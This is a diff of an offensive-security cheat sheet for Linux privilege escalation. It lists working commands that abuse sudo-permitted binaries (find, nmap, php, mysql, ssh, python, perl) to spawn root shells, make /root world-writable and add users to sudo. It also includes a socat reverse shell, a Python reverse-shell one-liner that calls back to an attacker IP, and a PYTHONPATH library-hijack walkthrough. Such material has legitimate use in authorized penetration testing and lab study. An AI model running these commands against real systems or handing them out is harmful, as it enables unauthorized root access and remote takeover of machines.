@@ -151,9 +151,9 @@ cat dump.sql
 
 
 ## Escalate Privileges
-https://github.com/gurkylee/Linux-Privilege-Escalation-Basics
+## LINUX
 
-
+### -- Begin checking logged in user capabilities --
 ```
 uname -a 
 hostname 
@@ -162,80 +162,77 @@ ls /home
 ls /var/www/html 
 ls /var/www/
 ```
-
-### sudo -l basics
+----------------------------------------------------------------------------------------------------------------
+### SUDO -L (Permissions)
 EXAMPLE OUTPUT:
-
-(root) NOPASSWD: /usr/bin/find
-(root) NOPASSWD: /usr/bin/nmap
-(root) NOPASSWD: /usr/bin/env
-(root) NOPASSWD: /usr/bin/vim
-(root) NOPASSWD: /usr/bin/awk
-(root) NOPASSWD: /usr/bin/perl
-(root) NOPASSWD: /usr/bin/python
-(root) NOPASSWD: /usr/bin/less
-(root) NOPASSWD: /usr/bin/man
-(root) NOPASSWD: /usr/bin/ftp
-(root) NOPASSWD: /usr/bin/socat
-(root) NOPASSWD: /usr/bin/zip
-(root) NOPASSWD: /usr/bin/gcc
-(root) NOPASSWD: /usr/bin/docker
-(root) NOPASSWD: /usr/bin/env
-(root) NOPASSWD: /usr/bin/MySQL
-(root) NOPASSWD: /usr/bin/ssh
-(root) NOPASSWD: /usr/bin/tmux
-(root) NOPASSWD: /usr/bin/pkexec
-(root) NOPASSWD: /usr/bin/rlwrap
-(root) NOPASSWD: /usr/bin/xargs
-(root) NOPASSWD: /usr/bin/anansi_util
-(root) NOPASSWD: /usr/bin/apt-get
-(root) NOPASSWD: /usr/bin/flask run
-(root) NOPASSWD: /usr/bin/apache2
-(root) NOPASSWD: /usr/bin/wget
-
-
 ```
-FIND
+#(root) NOPASSWD: /usr/bin/find
+#(root) NOPASSWD: /usr/bin/nmap
+#(root) NOPASSWD: /usr/bin/env
+#(root) NOPASSWD: /usr/bin/vim
+#(root) NOPASSWD: /usr/bin/awk
+#(root) NOPASSWD: /usr/bin/perl
+```
+```
+USE https://gtfobins.github.io/gtfobins/php/
+```
+### IF FIND (/usr/bin/find)
+```
 sudo find / etc/passwd -exec /bin/bash \;
 find . -exec chmod -R 777 /root \;
 find . -exec usermod -aG sudo user \;
 sudo find /home -exec /bin/bash \;
 ```
-
+### IF PHP (/usr/bin/php)
 ```
-https://gtfobins.github.io/gtfobins/php/
-e.g. for php to gain privilege
 sudo -u user_name php -r "system('/bin/sh');"
-
 ```
-
+### IF NMAP
 ```
-NMAP
 echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
-$ sudo nmap --interactive
-> !sh
+sudo nmap --interactive > !sh
 ```
-
+### IF SOCAT
 ```
-socat
 Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
 Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
 ```
-
+### IF MYSQL
 ```
-mysql
 sudo mysql -e '\! /bin/sh'
 ```
-
+### IF SSH
 ```
-ssh
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
+### IF /usr/bin/python
+```
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+### /usr/bin/python hijacking
+```
+(root) SETENV: NOPASSWD: /usr/bin/python3 /home/user/python_script.py
+//There is some kinda python lib hijacking. In short, to hijack, follow the steps:
+//get the location of python library (which is being used), in our case its /usr/lib/python3.8/
+//copy the example.py file to /tmp
+//cp /usr/lib/python3.8/example.py /tmp/example.py
+//add the reverse shell in the example.py file (where ever you want)
+//reverse shell used:
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+//Start the listener
+nc -lnvp 1234
+//to get the shell, run the command
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/user/python_script.py (which includes example.py library)
+//The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.
+```
+### IF /usr/bin/Perl
+```
+sudo perl -e 'exec "/bin/bash";'
+```
+More at https://github.com/gurkylee/Linux-Privilege-Escalation-Basics#absuing-sudo-binaries-to-gain-root
 
-```
-vim
-sudo vim -c ':!/bin/bash'
-```
+-------------------------------------------------------------------------------------------------------------------------------------
 
 ### Execute by adding /bin/bash
 ```
